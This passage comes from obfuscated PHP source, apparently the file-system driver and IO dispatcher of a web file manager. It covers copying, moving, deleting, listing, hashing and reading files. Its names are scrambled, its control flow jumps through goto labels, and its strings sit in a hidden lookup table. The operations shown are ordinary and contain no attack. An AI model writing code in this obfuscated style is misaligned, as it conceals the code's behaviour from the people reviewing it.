$aáÑè«ã½ë = $this->iconvSystem($aáÑè«ã½ë); $b›Ñ¤¢¿ÁÁ = @copy($D¶¡¦ì¶Å‹, $aáÑè«ã½ë); return $b›Ñ¤¢¿ÁÁ ? $this->getPathOuter($aáÑè«ã½ë) : !1; } public function moveFile($f­ĞİáÈÒ­, $d„°ëòµã) { $this->mkdir($this->pathFather($d„°ëòµã)); $f­ĞİáÈÒ­ = $this->iconvSystem($f­ĞİáÈÒ­); $d„°ëòµã = $this->iconvSystem($d„°ëòµã); $C¥ˆ¯ŠÙÑÒ = intval(@rename($f­ĞİáÈÒ­, $d„°ëòµã)); if (!$C¥ˆ¯ŠÙÑÒ) { if ($C¥ˆ¯ŠÙÑÒ = intval(@copy($f­ĞİáÈÒ­, $d„°ëòµã))) { @unlink($f­ĞİáÈÒ­); } } return $C¥ˆ¯ŠÙÑÒ ? $this->getPathOuter($d„°ëòµã) : !1; } public function delFile($bˆÏšÂ¤È) { $bˆÏšÂ¤È = $this->iconvSystem($bˆÏšÂ¤È); if (!@unlink($bˆÏšÂ¤È)) { @chmod($bˆÏšÂ¤È, 511); if (!@unlink($bˆÏšÂ¤È)) { return !1; } } else { return !0; } } public function delFolder($e¼­¨¢¿ƒÛ) { goto aéÖñØíõ¿; e¬Î¼©¶¹: return rmdir($e¼­¨¢¿ƒÛ); goto DŸÒñß¸ê ; aéÖñØíõ¿: $E‘õ©›¦“ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e¼­¨¢¿ƒÛ = $this->iconvSystem($e¼­¨¢¿ƒÛ); if (!is_dir($e¼­¨¢¿ƒÛ)) { return !0; } goto e·ñî˜ß´‚; e·ñî˜ß´‚: if (!($EÛôªá½­ = opendir($e¼­¨¢¿ƒÛ))) { return !1; } while (($C¶—‘ËÄİ° = readdir($EÛôªá½­)) !== !1) { if ($C¶—‘ËÄİ° == $E‘õ©›¦“[93] || $C¶—‘ËÄİ° == $E‘õ©›¦“[1149]) { continue; } $AÆ‹¢·Ú¿ = $e¼­¨¢¿ƒÛ . $E‘õ©›¦“[8] . $C¶—‘ËÄİ°; if (!is_dir($AÆ‹¢·Ú¿)) { if (!unlink($AÆ‹¢·Ú¿)) { chmod($AÆ‹¢·Ú¿, 511); if (!unlink($AÆ‹¢·Ú¿)) { return !1; } } } else { chmod($AÆ‹¢·Ú¿, 511); $AÆ‹¢·Ú¿ = $this->iconvApp($AÆ‹¢·Ú¿); if (!$this->delFolder($AÆ‹¢·Ú¿)) { return !1; } } } closedir($EÛôªá½­); goto e¬Î¼©¶¹; DŸÒñß¸ê : } public function rename($cñ£Œ·‘Ãî, $AÜ‰ËÈ„–¼) { goto DİÉö…¨êŸ; e‰¶¦±šƒ—: $cñ£Œ·‘Ãî = $this->iconvSystem($cñ£Œ·‘Ãî); $f„º‡Ã§•— = $this->pathFather($cñ£Œ·‘Ãî); $a·°™²‹–¤ = rtrim($f„º‡Ã§•—, $BÆ“Ëš¿Åö[8]) . $BÆ“Ëš¿Åö[8] . $cˆº¡—„¼; goto FÊ×—ìùºî; DİÉö…¨êŸ: $BÆ“Ëš¿Åö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cˆº¡—„¼ = $this->fileNameAuto($this->pathFather($cñ£Œ·‘Ãî), $AÜ‰ËÈ„–¼); $cˆº¡—„¼ = $this->iconvSystem($cˆº¡—„¼); goto e‰¶¦±šƒ—; FÊ×—ìùºî: $CŠŠø“¼Ğ = @rename($cñ£Œ·‘Ãî, $a·°™²‹–¤); $a·°™²‹–¤ = $this->iconvApp($a·°™²‹–¤); return $CŠŠø“¼Ğ ? $this->getPathOuter($a·°™²‹–¤) : !1; goto C·«ˆ¦Šù³; C·«ˆ¦Šù³: } public function size($f™éÇï³„Œ) { $f™éÇï³„Œ = $this->iconvSystem($f™éÇï³„Œ); return (double) abs(sprintf($_SERVER[ÚŠ•´ÍéÒÑÔ][1154], @filesize($f™éÇï³„Œ))); } public function info($cÙš¦Úìê) { $cÙš¦Úìê = $this->iconvSystem($cÙš¦Úìê); if ($this->isFolder($cÙš¦Úìê)) { return $this->folderInfo($cÙš¦Úìê); } else { if ($this->isFile($cÙš¦Úìê)) { return $this->fileInfo($cÙš¦Úìê); } } return !1; } protected function infoChildren($A¼äÅø™¿, &$a½ôÈ†õ½ö, $d±íøå½ÃÎ = true) { $d½ÆŒÂ™‡§ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A¼äÅø™¿ = rtrim($A¼äÅø™¿, $d½ÆŒÂ™‡§[8]) . $d½ÆŒÂ™‡§[8]; if ($d±íøå½ÃÎ) { check_abort(); $A¼äÅø™¿ = $this->iconvSystem($A¼äÅø™¿); } if (!($eÎ«Ç½ğ˜ = @opendir($A¼äÅø™¿))) { return; } while (($AÜ—‰®Ü’Ô = readdir($eÎ«Ç½ğ˜)) !== !1) { if ($AÜ—‰®Ü’Ô == $d½ÆŒÂ™‡§[93] || $AÜ—‰®Ü’Ô == $d½ÆŒÂ™‡§[1149]) { continue; } $c·óÇ¦ªŞ» = $A¼äÅø™¿ . $AÜ—‰®Ü’Ô; if (is_file($c·óÇ¦ªŞ»)) { $a½ôÈ†õ½ö[$d½ÆŒÂ™‡§[78]]++; $a½ôÈ†õ½ö[$d½ÆŒÂ™‡§[77]] += (double) abs(sprintf($d½ÆŒÂ™‡§[1154], @filesize($c·óÇ¦ªŞ»))); } else { $a½ôÈ†õ½ö[$d½ÆŒÂ™‡§[79]]++; $this->infoChildren($c·óÇ¦ªŞ», $a½ôÈ†õ½ö, !1); } } closedir($eÎ«Ç½ğ˜); } private function folderInfo($d©¨ÃÂ¹–Ò, $BëğØÎ¤ùò = false) { $b ˆäå—ß =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d©¨ÃÂ¹–Ò = rtrim($d©¨ÃÂ¹–Ò, $b ˆäå—ß[8]) . $b ˆäå—ß[8]; $dùˆö»±©á = $this->iconvApp($this->pathThis($d©¨ÃÂ¹–Ò)); if ($BëğØÎ¤ùò) { return array($b ˆäå—ß[28] => $dùˆö»±©á, $b ˆäå—ß[75] => $this->getPathOuter($d©¨ÃÂ¹–Ò), $b ˆäå—ß[29] => $b ˆäå—ß[76]); } $f­èê­¹¥Ú = array($b ˆäå—ß[28] => $dùˆö»±©á, $b ˆäå—ß[75] => $this->getPathOuter($d©¨ÃÂ¹–Ò), $b ˆäå—ß[29] => $b ˆäå—ß[76], $b ˆäå—ß[184] => @filectime($d©¨ÃÂ¹–Ò), $b ˆäå—ß[107] => @filemtime($d©¨ÃÂ¹–Ò), $b ˆäå—ß[1155] => @fileatime($d©¨ÃÂ¹–Ò), $b ˆäå—ß[1146] => is_readable($d©¨ÃÂ¹–Ò), $b ˆäå—ß[1147] => is_writable($d©¨ÃÂ¹–Ò), $b ˆäå—ß[1156] => get_mode($d©¨ÃÂ¹–Ò)); return $f­èê­¹¥Ú; } private function fileInfo($a®¹â¥Ø‘, $d˜›ƒà¢÷ê = false) { $C’ËÁÑ–Ù­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cïáÁ“¦ÑÍ = $this->iconvApp($this->pathThis($a®¹â¥Ø‘)); if ($d˜›ƒà¢÷ê) { return array($C’ËÁÑ–Ù­[28] => $cïáÁ“¦ÑÍ, $C’ËÁÑ–Ù­[75] => $this->getPathOuter($a®¹â¥Ø‘), $C’ËÁÑ–Ù­[29] => $C’ËÁÑ–Ù­[164], $C’ËÁÑ–Ù­[77] => $this->size($a®¹â¥Ø‘), $C’ËÁÑ–Ù­[157] => $this->ext($cïáÁ“¦ÑÍ)); } $c³ïËìÕÔ = array($C’ËÁÑ–Ù­[28] => $cïáÁ“¦ÑÍ, $C’ËÁÑ–Ù­[75] => $this->getPathOuter($a®¹â¥Ø‘), $C’ËÁÑ–Ù­[29] => $C’ËÁÑ–Ù­[164], $C’ËÁÑ–Ù­[184] => @filectime($a®¹â¥Ø‘), $C’ËÁÑ–Ù­[107] => @filemtime($a®¹â¥Ø‘), $C’ËÁÑ–Ù­[1155] => @fileatime($a®¹â¥Ø‘), $C’ËÁÑ–Ù­[77] => $this->size($a®¹â¥Ø‘), $C’ËÁÑ–Ù­[157] => $this->ext($cïáÁ“¦ÑÍ), $C’ËÁÑ–Ù­[1146] => is_readable($a®¹â¥Ø‘), $C’ËÁÑ–Ù­[1147] => is_writable($a®¹â¥Ø‘), $C’ËÁÑ–Ù­[1156] => get_mode($a®¹â¥Ø‘)); return $c³ïËìÕÔ; } public function exist($f£íÌÚ¼ÏÃ) { $f£íÌÚ¼ÏÃ = $this->iconvSystem($f£íÌÚ¼ÏÃ); return @file_exists($f£íÌÚ¼ÏÃ); } public function isFile($aĞ“Å‹ƒí) { $aĞ“Å‹ƒí = $this->iconvSystem($aĞ“Å‹ƒí); return @is_file($aĞ“Å‹ƒí); } public function isFolder($Aö¨Úº¦œ¯) { $Aö¨Úº¦œ¯ = $this->iconvSystem($Aö¨Úº¦œ¯); return @is_dir($Aö¨Úº¦œ¯); } public function listPath($A¿ÙÆÁâ£, $a±…Òõ»à« = false) { goto Eãì Å«Æ¼; bìŒùî½‹ñ: $f¿„ÍÌèôº = array($f×ÄÊÊë[74] => array(), $f×ÄÊÊë[73] => array()); if (!($A¹¬Ù¡¥ = @opendir($A¿ÙÆÁâ£))) { return $f¿„ÍÌèôº; } while (($FâİÄÀ„È« = readdir($A¹¬Ù¡¥)) !== !1) { if ($FâİÄÀ„È« == $f×ÄÊÊë[93] || $FâİÄÀ„È« == $f×ÄÊÊë[1149]) { continue; } $B ğˆŞ˜† = $A¿ÙÆÁâ£ . $FâİÄÀ„È«; if (is_file($B ğˆŞ˜†)) { $f¿„ÍÌèôº[$f×ÄÊÊë[73]][] = $this->fileInfo($B ğˆŞ˜†, $a±…Òõ»à«); } else { $f¿„ÍÌèôº[$f×ÄÊÊë[74]][] = $this->folderInfo($B ğˆŞ˜†, $a±…Òõ»à«); } } goto b¥•Æ”­£; Eãì Å«Æ¼: $f×ÄÊÊë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A¿ÙÆÁâ£ = $this->iconvSystem($A¿ÙÆÁâ£); $A¿ÙÆÁâ£ = rtrim($A¿ÙÆÁâ£, $f×ÄÊÊë[8]) . $f×ÄÊÊë[8]; goto bìŒùî½‹ñ; b¥•Æ”­£: closedir($A¹¬Ù¡¥); return $f¿„ÍÌèôº; goto Cº¢šùĞîŠ; Cº¢šùĞîŠ: } public function listAll($AÄå°Şã±, &$b“¸ì©æ»Ã = array()) { goto eµ‚ÃŒ•Âƒ; eµ‚ÃŒ•Âƒ: $DŠ‚ÌæÕ â =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÄå°Şã± = $this->iconvSystem($AÄå°Şã±); $AÄå°Şã± = rtrim($AÄå°Şã±, $DŠ‚ÌæÕ â[8]) . $DŠ‚ÌæÕ â[8]; goto fòÙß­¥; A„Ö˜”•‹: return $b“¸ì©æ»Ã; goto EÄôÀğÎàâ; fòÙß­¥: if (!($fóËÀÑÀè° = @opendir($AÄå°Şã±))) { return $b“¸ì©æ»Ã; } while (($eÄ†ö·‡“½ = readdir($fóËÀÑÀè°)) !== !1) { if ($eÄ†ö·‡“½ == $DŠ‚ÌæÕ â[93] || $eÄ†ö·‡“½ == $DŠ‚ÌæÕ â[1149]) { continue; } $E÷áÙÉ™çë = $AÄå°Şã± . $eÄ†ö·‡“½; if (is_dir($E÷áÙÉ™çë)) { $b“¸ì©æ»Ã[] = array($DŠ‚ÌæÕ â[75] => $E÷áÙÉ™çë . $DŠ‚ÌæÕ â[8], $DŠ‚ÌæÕ â[76] => 1, $DŠ‚ÌæÕ â[77] => 0); $this->listAll($E÷áÙÉ™çë, $b“¸ì©æ»Ã); } else { $b“¸ì©æ»Ã[] = array($DŠ‚ÌæÕ â[75] => $E÷áÙÉ™çë, $DŠ‚ÌæÕ â[76] => 0, $DŠ‚ÌæÕ â[77] => $this->size($E÷áÙÉ™çë)); } } closedir($fóËÀÑÀè°); goto A„Ö˜”•‹; EÄôÀğÎàâ: } public function has($C‡§ğëœÉÅ, $BÆ¼¢ò©ğô = false, $DÎ¯‰èÏ´Ü = true) { goto aÏ‚”Ë‹âÎ; d‰œŸİÈ¡: if (!($Cé™´àäº˜ = @opendir($C‡§ğëœÉÅ))) { return !1; } $Fçèô·©ª­ = 0; $f†Ç±°Î÷ = 0; goto A‘¤À—¥ŸÓ; aÏ‚”Ë‹âÎ: $B“ÍÀò¥³· =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C‡§ğëœÉÅ = $this->iconvSystem($C‡§ğëœÉÅ); $C‡§ğëœÉÅ = rtrim($C‡§ğëœÉÅ, $B“ÍÀò¥³·[8]) . $B“ÍÀò¥³·[8]; goto d‰œŸİÈ¡; eÜ×¿™ğº¶: return !1; goto cã¼‡ÖÔ’î; A‘¤À—¥ŸÓ: while (($a×ßè¾Š© = readdir($Cé™´àäº˜)) !== !1) { if ($a×ßè¾Š© == $B“ÍÀò¥³·[93] || $a×ßè¾Š© == $B“ÍÀò¥³·[1149]) { continue; } $dÁáÜÜˆĞÊ = $C‡§ğëœÉÅ . $a×ßè¾Š©; if ($BÆ¼¢ò©ğô) { if (@is_file($dÁáÜÜˆĞÊ)) { $Fçèô·©ª­++; } else { $f†Ç±°Î÷++; } continue; } if ($DÎ¯‰èÏ´Ü) { if (@is_file($dÁáÜÜˆĞÊ)) { return !0; } } else { if (@is_dir($dÁáÜÜˆĞÊ . $B“ÍÀò¥³·[8])) { return !0; } } } closedir($Cé™´àäº˜); if ($BÆ¼¢ò©ğô) { return array($B“ÍÀò¥³·[188] => $Fçèô·©ª­, $B“ÍÀò¥³·[189] => $f†Ç±°Î÷); } goto eÜ×¿™ğº¶; cã¼‡ÖÔ’î: } public function hashSimple($cÏ¸•Ÿ²±í) { goto cÂ‡”»ÖÑİ; bÎ†®×Ä†ñ: fseek($bÔìó‚Øé†, $c×î‹¾½Ù - $e³™‹«Á); $E”ÒˆŠÃ .= fread($bÔìó‚Øé†, $e³™‹«Á); fclose($bÔìó‚Øé†); goto bŒğ›ÎÜ”ƒ; f˜èºµë‰: $c×î‹¾½Ù = $this->size($cÏ¸•Ÿ²±í); $e³™‹«Á = 200; $EÈ‰ÆÜåù = 50; goto Fß³²«øè; bŒğ›ÎÜ”ƒ: return md5($E”ÒˆŠÃ) . $c×î‹¾½Ù; goto DÂô‡‘; Fß³²«øè: if ($c×î‹¾½Ù <= $e³™‹«Á * $EÈ‰ÆÜåù) { return $this->hashMd5($cÏ¸•Ÿ²±í) . $c×î‹¾½Ù; } $E”ÒˆŠÃ = $DÜ”İù¬Â[33]; $D…š“Ú›É = intval($c×î‹¾½Ù / $EÈ‰ÆÜåù); goto B­‹¦ãõÒë; B­‹¦ãõÒë: $bÔìó‚Øé† = fopen($cÏ¸•Ÿ²±í, $DÜ”İù¬Â[1157]); if (!$bÔìó‚Øé†) { return $E”ÒˆŠÃ; } for ($c½…ÖŠÆøÙ = 0; $c½…ÖŠÆøÙ < $EÈ‰ÆÜåù; $c½…ÖŠÆøÙ++) { fseek($bÔìó‚Øé†, $D…š“Ú›É * $c½…ÖŠÆøÙ); $E”ÒˆŠÃ .= fread($bÔìó‚Øé†, $e³™‹«Á); } goto bÎ†®×Ä†ñ; cÂ‡”»ÖÑİ: $DÜ”İù¬Â =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$cÏ¸•Ÿ²±í) { return md5($DÜ”İù¬Â[33]); } $cÏ¸•Ÿ²±í = $this->iconvSystem($cÏ¸•Ÿ²±í); goto f˜èºµë‰; DÂô‡‘: } public function getContent($CáÅ‰¤İÅ) { $CáÅ‰¤İÅ = $this->iconvSystem($CáÅ‰¤İÅ); return file_get_contents($CáÅ‰¤İÅ); } public function setContent($DÕµç¦ò¨â, $CÌ…Å ÑÚª = '') { $DÕµç¦ò¨â = $this->iconvSystem($DÕµç¦ò¨â); @file_put_contents($DÕµç¦ò¨â, $CÌ…Å ÑÚª, LOCK_EX); clearstatcache(); return strlen($CÌ…Å ÑÚª) == filesize($DÕµç¦ò¨â); } public function fileSubstr($DÙˆí¥ŞÒØ, $aÆèİîĞ– = 0, $bà¾ô¢§â = false) { goto dª·›„×ºè; dª·›„×ºè: $eóƒ¢áá¢ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DÙˆí¥ŞÒØ = $this->iconvSystem($DÙˆí¥ŞÒØ); if ($bà¾ô¢§â === !1) { $bà¾ô¢§â = $this->size($DÙˆí¥ŞÒØ); } goto bš×ÊâÍ¥à; bš×ÊâÍ¥à: if ($bà¾ô¢§â <= 0) { return $eóƒ¢áá¢[33]; } $ašğ¾”¾Òİ = fopen($DÙˆí¥ŞÒØ, $eóƒ¢áá¢[1157]); if (!$ašğ¾”¾Òİ) { return !1; } goto e’ŒöŞ“Ñø; FÎå›éœ: return $e›­ÕœäÕì; goto EÔô˜¢«ŒÊ; e’ŒöŞ“Ñø: fseek($ašğ¾”¾Òİ, $aÆèİîĞ–); $e›­ÕœäÕì = fread($ašğ¾”¾Òİ, $bà¾ô¢§â); fclose($ašğ¾”¾Òİ); goto FÎå›éœ; EÔô˜¢«ŒÊ: } public function upload($d•ÍìÒòÂ, $dÜ×„¡àö¯, $B¬šá•¿ˆĞ = false, $bñ‘ºèÈÙ¹ = REPEAT_REPLACE) { $E£‹êöˆ±Ö = $this->copyFile($dÜ×„¡àö¯, $d•ÍìÒòÂ); return $E£‹êöˆ±Ö ? $this->getPathOuter($d•ÍìÒòÂ) : !1; } public function download($aéá‰Ç¿ó©, $a§†¯ˆÆ‡Æ) { return $this->iconvSystem($aéá‰Ç¿ó©); } } goto eÅóïÚİäà; fÜ”¯°ô: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($AÀ·¥Œùñ, $BŞÂ£ğ¬Ğš) { $Fëó§‚½İã = self::driverMake($BŞÂ£ğ¬Ğš[0]); if (method_exists($Fëó§‚½İã, $AÀ·¥Œùñ)) { return @call_user_func_array(array($Fëó§‚½İã, $AÀ·¥Œùñ), $BŞÂ£ğ¬Ğš); } if (method_exists($Fëó§‚½İã, $_SERVER[ÚŠ•´ÍéÒÑÔ][989])) { return @call_user_func_array(array($Fëó§‚½İã, $AÀ·¥Œùñ), $BŞÂ£ğ¬Ğš); } else { if (method_exists(self, $AÀ·¥Œùñ)) { return @call_user_func_array(array(self, $AÀ·¥Œùñ), $BŞÂ£ğ¬Ğš); } else { call_user_func_array(array(parent, $AÀ·¥Œùñ), $BŞÂ£ğ¬Ğš); } } } public static function init($Aæ‰î¹¨÷Œ) { return self::driverMake($Aæ‰î¹¨÷Œ); } public static function copy($Dã›°£‘É, $a¾²ªõˆ‚±, $Cœç›µÉ = false, $Fœö‡–î¨Õ = false) { return self::copyMove($Dã›°£‘É, $a¾²ªõˆ‚±, $Cœç›µÉ, $_SERVER[ÚŠ•´ÍéÒÑÔ][486], $Fœö‡–î¨Õ); } public static function move($d—½®Ç´«¿, $f¢¼÷Å…Óï, $AŠá²†­Õã = false, $aê—¥ˆËîé = false) { return self::copyMove($d—½®Ç´«¿, $f¢¼÷Å…Óï, $AŠá²†­Õã, $_SERVER[ÚŠ•´ÍéÒÑÔ][488], $aê—¥ˆËîé); } public static function saveFile($f¾Ô†£¤«î, $Fø¦õÃ¦¸©, $DÏ©ÌŞƒŠ = true) { goto D¾¨¡ŒŞ²ë; D¾¨¡ŒŞ²ë: $f› ë‹Â¡Ã =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÄ‚«÷È— = self::info($Fø¦õÃ¦¸©); $a©†½¹§Üé = self::driverMake($f¾Ô†£¤«î); goto Bƒ®ç†ÜŒÃ; Bƒ®ç†ÜŒÃ: $c§ÈíÑéñê = self::driverMake($Fø¦õÃ¦¸©); $AÄ¢Œ½§»ì = !1; if ($c§ÈíÑéñê->pathParse[$f› ë‹Â¡Ã[990]]) { $aÚÈ¦ÊÖ = $c§ÈíÑéñê->pathParse[$f› ë‹Â¡Ã[990]]; $AÄ¢Œ½§»ì = $c§ÈíÑéñê; $c§ÈíÑéñê = self::driverMake($aÚÈ¦ÊÖ); } goto FÚ¨âÜ·ÔÙ; CÛŒ»“İ«: $D’´Î¬‡Œ  = self::copyFile($a©†½¹§Üé, $f¾Ô†£¤«î, $c§ÈíÑéñê, $bííì»Úñ, $EÄ‚«÷È—[$f› ë‹Â¡Ã[28]], $F±å¤§ç½·); if ($AÄ¢Œ½§»ì) { $D’´Î¬‡Œ  = $AÄ¢Œ½§»ì->getPathOuter($D’´Î¬‡Œ ); } return $D’´Î¬‡Œ ; goto E‘È‘«¹âÅ; FÚ¨âÜ·ÔÙ: $bííì»Úñ = $c§ÈíÑéñê->pathFather($Fø¦õÃ¦¸©); $F±å¤§ç½· = !0; if (!$DÏ©ÌŞƒŠ && self::driverIsSame($a©†½¹§Üé, $c§ÈíÑéñê)) { $F±å¤§ç½· = !1; } goto CÛŒ»“İ«; E‘È‘«¹âÅ: } private static function copyMove($F®„—À™å†, $Aóá¾Âøïµ, $aŞßÎäŠÂø, $ašİ…Ó»é‘, $d¶Š‘ô²¯ = false) { goto CÎ®²ïøßì; f·¹§ãŞâè: if ($CÁ•‹åç´á) { $c†¢‰›‡É­ = $CÁ•‹åç´á->getPathOuter($c†¢‰›‡É­); } return $c†¢‰›‡É­; goto e™ÇÇ›ò‹; F’Ë¦†ÛÀ: $CÁ•‹åç´á = !1; if ($DĞ—¦¼Ñ’Ş->pathParse[$dò“ÇŞèæ[990]]) { $Aóá¾Âøïµ = $DĞ—¦¼Ñ’Ş->pathParse[$dò“ÇŞèæ[990]]; $CÁ•‹åç´á = $DĞ—¦¼Ñ’Ş; $DĞ—¦¼Ñ’Ş = self::driverMake($Aóá¾Âøïµ); } self::check($DâòÜ™ĞíÎ, $F®„—À™å†, $DĞ—¦¼Ñ’Ş, $Aóá¾Âøïµ); goto C«ÛãáğŸ¶; CÎ®²ïøßì: $dò“ÇŞèæ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$F®„—À™å† || $F®„—À™å† == $dò“ÇŞèæ[8] || !$Aóá¾Âøïµ) { return !1; } ignore_timeout(); goto d™ì¥—òƒˆ; eãµ¨³ŒÈŒ: $BòáÖ™È = $DâòÜ™ĞíÎ->isFile($F®„—À™å†); if (!$BòáÖ™È && $DĞ—¦¼Ñ’Ş->getType() == $dò“ÇŞèæ[689] && $DâòÜ™ĞíÎ->getType() == $dò“ÇŞèæ[103]) { $c†¢‰›‡É­ = $DĞ—¦¼Ñ’Ş->copyFolderFromIO($DâòÜ™ĞíÎ, $F®„—À™å†, $Aóá¾Âøïµ, $aŞßÎäŠÂø, $b°ªíÏØ Ù, $d¶Š‘ô²¯); } else { $c†¢‰›‡É­ = self::copyPath($DâòÜ™ĞíÎ, $F®„—À™å†, $DĞ—¦¼Ñ’Ş, $Aóá¾Âøïµ, $aŞßÎäŠÂø, $b°ªíÏØ Ù, $BòáÖ™È, $d¶Š‘ô²¯); } if ($c†¢‰›‡É­ && $b°ªíÏØ Ù) { $DâòÜ™ĞíÎ->remove($F®„—À™å†); } goto f·¹§ãŞâè; d™ì¥—òƒˆ: $DâòÜ™ĞíÎ = self::driverMake($F®„—À™å†); $DĞ—¦¼Ñ’Ş = self::driverMake($Aóá¾Âøïµ); $b°ªíÏØ Ù = $ašİ…Ó»é‘ == $dò“ÇŞèæ[488]; goto F’Ë¦†ÛÀ; C«ÛãáğŸ¶: Hook::trigger($dò“ÇŞèæ[72], $DâòÜ™ĞíÎ, $F®„—À™å†, $DĞ—¦¼Ñ’Ş, $Aóá¾Âøïµ); $FñÄ¢ºñ‘× = self::driverIsSame($DâòÜ™ĞíÎ, $DĞ—¦¼Ñ’Ş); if ($FñÄ¢ºñ‘×) { if ($ašİ…Ó»é‘ == $dò“ÇŞèæ[488] && trim($Aóá¾Âøïµ, $dò“ÇŞèæ[8]) == trim($DĞ—¦¼Ñ’Ş->pathFather($F®„—À™å†), $dò“ÇŞèæ[8])) { return $DĞ—¦¼Ñ’Ş->getPathOuter($F®„—À™å†); } if (method_exists($DĞ—¦¼Ñ’Ş, $ašİ…Ó»é‘)) { return $DĞ—¦¼Ñ’Ş->{$ašİ…Ó»é‘}($F®„—À™å†, $Aóá¾Âøïµ, $aŞßÎäŠÂø); } } goto eãµ¨³ŒÈŒ; e™ÇÇ›ò‹: } private static function check($DáÚÃœæ­ª, $D±¨ÇçÙ„§, $B«ŞŠîí¢, &$B†ºÆŠ¤Ïï) { $dğ¦†öÅ² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (self::driverIsSame($DáÚÃœæ­ª, $B«ŞŠîí¢) && $DáÚÃœæ­ª->isFolder($D±¨ÇçÙ„§) && $DáÚÃœæ­ª->isParentOf($D±¨ÇçÙ„§, $B†ºÆŠ¤Ïï)) { show_json(LNG($dğ¦†öÅ²[991]), !1); } if (!$DáÚÃœæ­ª->exist($D±¨ÇçÙ„§)) { show_json(LNG($dğ¦†öÅ²[102]), !1); } } private static function copyPath($AåêÃÜƒ¡é, $FÖ¶óå÷©ø, $E›´ó°†ìè, $FÔÃã’´Äö, $b‰½‘‘æ‡, $Aª×±¬¼Š, $aÑäöÍ‹š, $b™‹„æŒÎÂ = false) { goto a—àÚï«îÃ; AÍàøêÉ—: $béèÖºïÌ = array_merge($fÎ¬ñ„°¨ö[$fë°ÕŒ¿ŸÏ[73]], $fÎ¬ñ„°¨ö[$fë°ÕŒ¿ŸÏ[74]]); foreach ($béèÖºïÌ as $BÜ„é“Á÷) { $C¾°¶Ì¬êÅ = $BÜ„é“Á÷[$fë°ÕŒ¿ŸÏ[29]] == $fë°ÕŒ¿ŸÏ[164]; $FÖ¶óå÷©ø = $AåêÃÜƒ¡é->getPathInner($BÜ„é“Á÷[$fë°ÕŒ¿ŸÏ[75]]); $D’×·“¯¶‚ = self::copyPath($AåêÃÜƒ¡é, $FÖ¶óå÷©ø, $E›´ó°†ìè, $FÔÃã’´Äö, $b‰½‘‘æ‡, $Aª×±¬¼Š, $C¾°¶Ì¬êÅ); if (!$D’×·“¯¶‚) { write_log($fë°ÕŒ¿ŸÏ[992] . $FÖ¶óå÷©ø . $fë°ÕŒ¿ŸÏ[993] . $FÔÃã’´Äö, $fë°ÕŒ¿ŸÏ[994]); } } return $f¡àæ°›; goto E»ãñÖË¤Ù; Aíâ¶àâ‰±: $f¡àæ°› = $E›´ó°†ìè->mkdir($E›´ó°†ìè->getPath($d†¬Ş™éÖº)); $FÔÃã’´Äö = $E›´ó°†ìè->getPathInner($f¡àæ°›); $fÎ¬ñ„°¨ö = $AåêÃÜƒ¡é->listPath($FÖ¶óå÷©ø, !0); goto AÍàøêÉ—; a—àÚï«îÃ: $fë°ÕŒ¿ŸÏ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DËñ°Äá” = $b™‹„æŒÎÂ ? $b™‹„æŒÎÂ : $AåêÃÜƒ¡é->getPathName($AåêÃÜƒ¡é->pathThis($FÖ¶óå÷©ø)); if ($b‰½‘‘æ‡) { $E¯½­¸Ø¦æ = $E›´ó°†ìè->fileNameExist($FÔÃã’´Äö, $DËñ°Äá”); $DËñ°Äá” = $E›´ó°†ìè->fileNameAuto($FÔÃã’´Äö, $DËñ°Äá”, $b‰½‘‘æ‡, !$aÑäöÍ‹š); $b‰½‘‘æ‡ = $E¯½­¸Ø¦æ ? $b‰½‘‘æ‡ : !1; } goto e—óç‰—»Í; e—óç‰—»Í: if ($aÑäöÍ‹š) { return self::copyFile($AåêÃÜƒ¡é, $FÖ¶óå÷©ø, $E›´ó°†ìè, $FÔÃã’´Äö, $DËñ°Äá”, $Aª×±¬¼Š); } if ($b‰½‘‘æ‡ == REPEAT_RENAME_FOLDER) { $b‰½‘‘æ‡ = !1; } $d†¬Ş™éÖº = rtrim($FÔÃã’´Äö, $fë°ÕŒ¿ŸÏ[8]) . $fë°ÕŒ¿ŸÏ[8] . $DËñ°Äá”; goto Aíâ¶àâ‰±; E»ãñÖË¤Ù: } private static function copyFile($cÜ””µÌ¥ê, $E¬ÍÅŠÉìã, $cŠ„øÔŠê, $Dß¯œ„—Îª, $DˆŞµëÁªÛ, $aÙ•˜Áƒ) { goto c‹²Ò·¾Ÿù; F—ø¾»ãäÜ: mk_dir($dÍºËçÊ÷Ï); $fÛª¢¤¦ˆà = $dÍºËçÊ÷Ï . $eéˆñº¨³¾; $fÛª¢¤¦ˆà = $cÜ””µÌ¥ê->download($E¬ÍÅŠÉìã, $fÛª¢¤¦ˆà); goto fÁ—±Š¯Û‡; A‰À’ÈÔ­: Hook::trigger($DŸÀ–ºŸğ…[997], $cÜ””µÌ¥ê, $E¬ÍÅŠÉìã, $cŠ„øÔŠê, $Dß¯œ„—Îª, $DˆŞµëÁªÛ, $Bİƒ†¤ŠË¿); return $Bİƒ†¤ŠË¿; goto d‡íÃŠİ©•; eÅ¦­…´áÏ: Hook::trigger($DŸÀ–ºŸğ…[996], $cÜ””µÌ¥ê, $E¬ÍÅŠÉìã, $cŠ„øÔŠê, $Dß¯œ„—Îª, $DˆŞµëÁªÛ, $eéˆñº¨³¾); if (self::driverIsSame($cÜ””µÌ¥ê, $cŠ„øÔŠê)) { if ($aÙ•˜Áƒ) { $Bİƒ†¤ŠË¿ = $cŠ„øÔŠê->moveFile($E¬ÍÅŠÉìã, $Dß¯œ„—Îª); } else { $Bİƒ†¤ŠË¿ = $cŠ„øÔŠê->copyFile($E¬ÍÅŠÉìã, $Dß¯œ„—Îª); } Hook::trigger($DŸÀ–ºŸğ…[997], $cÜ””µÌ¥ê, $E¬ÍÅŠÉìã, $cŠ„øÔŠê, 